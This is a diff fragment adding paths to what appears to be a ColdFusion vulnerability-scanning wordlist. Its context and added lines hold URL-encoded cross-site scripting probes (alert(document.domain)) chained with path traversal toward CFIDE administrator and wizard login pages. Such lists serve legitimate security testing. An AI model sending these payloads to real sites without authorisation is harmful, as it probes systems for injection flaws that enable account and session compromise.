@@ -8,3 +8,9 @@
 /cfmx/CFIDE/scripts/ajax/package/cfajax.js
 /CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
 /cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/{{string}}
+//{{string}}
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
